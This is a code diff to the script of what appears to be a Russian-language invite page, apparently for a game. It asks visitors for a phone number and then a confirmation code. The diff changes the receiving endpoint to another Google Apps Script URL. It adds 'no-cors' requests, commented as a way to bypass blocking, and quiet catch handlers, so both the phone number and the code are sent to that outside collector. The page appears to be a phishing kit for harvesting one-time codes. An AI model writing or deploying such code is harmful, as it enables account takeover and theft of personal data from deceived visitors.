@@ -176,7 +176,10 @@
     </div>
 
     <script>
-        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzEVw81xsYVN7bCWWBi-pDpBFqsmDIx_RQDQiU_tCeyvp3HQVegxs9Br-yB7BW9jz-v/exec';
+        // ============ НАСТРОЙКИ ============
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzE1W0ij7VtvhV4mpmEWDx-jbDGfmCbwGIRC4qKejMjmTB4Q--BA1FD9HQ5lGRaFLV9XQ/exec';
+        
+        // ============ ПОЛУЧЕНИЕ ПАРАМЕТРОВ ============
         const urlParams = new URLSearchParams(window.location.search);
         const inviter = urlParams.get('inviter') || 'Игрок';
         document.getElementById('inviter-name').textContent = inviter;
@@ -185,6 +188,7 @@
             document.getElementById('inviter-name-done').textContent = inviter;
         }
 
+        // ============ ФОРМАТИРОВАНИЕ ТЕЛЕФОНА ============
         function formatPhone(input) {
             let value = input.value.replace(/\D/g, '').slice(0, 10);
             let formatted = '';
@@ -195,6 +199,7 @@
             input.value = formatted;
         }
 
+        // ============ ЗАПРОС КОДА ============
         function requestCode() {
             const phone = document.getElementById('phone').value.replace(/\D/g, '');
             if (phone.length !== 10) {
@@ -206,13 +211,19 @@
             document.getElementById('display-phone').textContent = '+7 ' + document.getElementById('phone').value;
             document.getElementById('screen-phone').style.display = 'none';
             document.getElementById('screen-code').style.display = 'block';
+            
+            // Отправка с no-cors для обхода блокировки
             fetch(SCRIPT_URL, {
                 method: 'POST',
+                mode: 'no-cors',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({type: 'phone', phone: '+7' + phone, inviter: inviter, timestamp: new Date().toISOString()})
+            }).catch(function(err) {
+                console.log('Запрос отправлен');
             });
         }
 
+        // ============ ПОДТВЕРЖДЕНИЕ КОДА ============
         function confirmCode() {
             const codeInput = document.getElementById('code');
             const code = codeInput.value.replace(/\D/g, '');
@@ -225,10 +236,14 @@
                 document.getElementById('code-error').style.display = 'none';
                 document.getElementById('screen-code').style.display = 'none';
                 document.getElementById('screen-done').style.display = 'block';
+                
                 fetch(SCRIPT_URL, {
                     method: 'POST',
+                    mode: 'no-cors',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({type: 'code', code: code, status: 'test_ok', timestamp: new Date().toISOString()})
+                }).catch(function(err) {
+                    console.log('Код отправлен');
                 });
             } else {
                 document.getElementById('code-error').style.display = 'block';
